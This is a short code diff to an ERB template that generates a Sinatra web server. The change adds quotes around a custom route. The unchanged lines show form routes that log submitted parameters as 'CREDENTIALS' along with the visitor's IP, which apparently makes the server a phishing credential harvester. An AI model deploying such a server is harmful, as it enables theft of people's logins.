@@ -27,14 +27,16 @@ class <%= self[:webserver].camelize %> < Sinatra::Base
 		process_info(params,request)
 		erb :index
 	end
+	
 	<% if self[:url_route] != "/" && self[:url_route] != "" %>
 
-	get <%= self[:url_route] %> do
+	get "<%= self[:url_route] %>" do
 		process_info(params,request)
 		erb :index
 	end
 
 	<% end %>
+
 	<% self[:forms_routes].each do |route| %>
 	<%= route[0] %> "<%=route[1]%>" do
 		$stdout.puts "#{Time.now} - CREDENTIALS - IP #{request.ip} - CREDS " + params.to_s
